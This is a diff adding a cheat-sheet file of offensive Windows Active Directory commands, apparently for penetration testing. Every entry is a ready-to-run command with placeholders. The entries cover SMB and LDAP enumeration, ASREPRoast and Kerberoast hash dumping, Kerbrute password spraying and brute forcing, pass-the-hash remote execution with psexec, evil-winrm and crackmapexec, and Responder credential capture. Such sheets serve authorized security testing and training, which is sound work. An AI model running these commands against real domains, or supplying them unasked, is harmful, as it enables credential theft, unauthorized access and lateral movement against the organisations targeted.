@@ -1,0 +1,55 @@
+% Windows, AD
+
+# Enum4linux
+enum4linux -a -u "user" -p "password" <IP>
+
+# Impacket get all AD users
+GetADUsers.py -all -dc-ip <DC_IP> <DOMAIN>/<USERNAME>
+
+# Impacket ASREPRoast
+python GetNPUsers.py <DOMAIN>/ -usersfile <USERNAME_LIST> -format hashcat -outputfile hashes.asreproast
+
+# Impacket Kerberoast
+GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast 
+
+# Bloodhound Python
+bloodhound-python -u <USERNAME> -p '<PASSWORD>' -ns <NAME_SERVER> -d <DOMAIN> -c all
+
+# ZeroLogon check
+crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M zerologon
+
+# SMBMap enum
+smbmap -H <IP> -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>"
+
+# SMBClient list folder no cred
+smbclient --no-pass -L //<IP>
+
+# SMBClient connect folder no cred
+smbclient --no-pass //<IP>/<FOLDER>
+
+# Kerbrute userenum
+kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USERNAME_LIST>
+
+# Kerbrute password spray
+kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> <USERNAME_LIST> '<PASSWORD>'
+
+# Kerbrute bruteforce user
+kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> <PASSWORD_LIST> <USERNAME> -t 50
+
+# User description check Crackmapexec
+crackmapexec ldap <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc
+
+# Pass-the-hash PSExec
+psexec.py -hashes <NTML_HASH> <USERNAME>@<IP>
+
+# Wmiexec login
+wmiexec.py '<USERNAME>:<PASSWORD>@<IP>'
+
+# Pass-the-hash Winrm
+evil-winrm -i <IP> -u <USERNAME> -H <NT>
+
+# Pass-the-hash Crackmapexec
+cme smb <IP> -u <USERNAME> -H '<NTLM_HASH>' -x "whoami"
+
+# Responder
+sudo responder -I tun0
